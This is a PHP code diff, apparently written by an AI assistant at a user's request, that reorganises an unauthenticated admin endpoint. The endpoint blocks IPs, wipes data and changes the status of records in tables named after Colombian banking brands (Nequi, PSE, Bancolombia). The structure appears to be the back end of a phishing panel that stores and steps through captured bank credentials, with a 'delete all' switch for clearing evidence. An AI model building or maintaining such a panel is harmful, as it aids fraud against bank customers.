@@ -7,8 +7,10 @@ require_once __DIR__ . '/../config/db.php';
 // Validar parámetros
 file_put_contents('debug_actions.txt', date('Y-m-d H:i:s') . " - Request: " . print_r($_GET, true) . "\n", FILE_APPEND);
 
+// Verify if we have at least an action OR a set of id/table/estado
 if (isset($_GET['action']) || (isset($_GET['id'], $_GET['table'], $_GET['estado']))) {
-    // IP Logic
+
+    // 1. IP Logic (Global Action)
     if (isset($_GET['action'])) {
         if ($_GET['action'] === 'block_ip' && isset($_GET['ip'])) {
             $stmt = $conn->prepare("INSERT IGNORE INTO blocked_ips (ip) VALUES (:ip)");
@@ -22,39 +24,43 @@ if (isset($_GET['action']) || (isset($_GET['id'], $_GET['table'], $_GET['estado'
             echo json_encode(['status' => 'success']);
             exit;
         }
-            exit;
+
+        // 2. DELETE ALL Logic (Global Action)
+        // Moved here to avoid 'Die: Faltan parámetros' if ID/Table are missing
+        if ($_GET['action'] === 'delete_all') {
+            try {
+                // Delete all from allowed tables
+                foreach (['pse', 'nequi'] as $t) {
+                    // TRUNCATE is faster and resets IDs
+                    $conn->exec("TRUNCATE TABLE $t");
+                }
+                echo json_encode(['status' => 'success', 'message' => 'Panel limpiado correctamente']);
+                exit();
+            } catch (PDOException $e) {
+                echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
+                exit();
+            }
         }
     }
 
-    // Acción Eliminar TODO (Nuke)
-    if (isset($_GET['action']) && $_GET['action'] === 'delete_all') {
-        try {
-            // Delete all from allowed tables
-            foreach (['pse', 'nequi'] as $t) {
-                // TRUNCATE is faster and resets IDs
-                $conn->exec("TRUNCATE TABLE $t");
-            }
-            // Also clear uploads maybe? User said "eliminar todos los datos"
-            // Let's safe-keep uploads for now unless requested, but clearing DB is key.
-            echo json_encode(['status' => 'success', 'message' => 'Panel limpiado correctamente']);
-            exit();
-        } catch (PDOException $e) {
-            echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
-            exit();
-        }
+    // 3. Item Specific Actions (Require ID, Table)
+    if (!isset($_GET['id']) || !isset($_GET['table'])) {
+        // If we reached here without global action match, and missing ID/Table, it's an error
+        die("Faltan parámetros");
     }
 
     $id = intval($_GET['id']);
     $table = $_GET['table'];
-    $estado = intval($_GET['estado']);
+    // State is optional for delete action
+    $estado = isset($_GET['estado']) ? intval($_GET['estado']) : 0;
 
     // Validar nombre de tabla para prevenir SQL Injection
-    $allowed_tables = ['nequi', 'pse', 'bancolombia']; // Agrega más si existen
+    $allowed_tables = ['nequi', 'pse', 'bancolombia'];
     if (!in_array($table, $allowed_tables)) {
         die("Tabla no permitida");
     }
 
-    // Acción Eliminar
+    // Acción Eliminar Single Item
     if (isset($_GET['action']) && $_GET['action'] === 'delete') {
         try {
             $sql = "DELETE FROM $table WHERE id = :id";
@@ -68,37 +74,19 @@ if (isset($_GET['action']) || (isset($_GET['id'], $_GET['table'], $_GET['estado'
         }
     }
 
-    // Acción Eliminar TODO (Nuke)
-    if (isset($_GET['action']) && $_GET['action'] === 'delete_all') {
-        try {
-            // Delete all from allowed tables
-            foreach (['pse', 'nequi'] as $t) {
-                // TRUNCATE is faster and resets IDs
-                $conn->exec("TRUNCATE TABLE $t");
-            }
-            // Also clear uploads maybe? User said "eliminar todos los datos"
-            // Let's safe-keep uploads for now unless requested, but clearing DB is key.
-            echo json_encode(['status' => 'success', 'message' => 'Panel limpiado correctamente']);
-            exit();
-        } catch (PDOException $e) {
-            echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
-            exit();
-        }
-    }
-
-    // Actualizar estado
+    // Actualizar estado (Default Action if no 'action' param)
     try {
         $sql = "UPDATE $table SET estado = :estado WHERE id = :id";
         $stmt = $conn->prepare($sql);
         $stmt->execute(['estado' => $estado, 'id' => $id]);
 
-        // Return JSON response for AJAX
         echo json_encode(['status' => 'success', 'message' => 'Estado actualizado']);
         exit();
     } catch (PDOException $e) {
         echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
         exit();
     }
+
 } else {
     die("Faltan parámetros");
 }
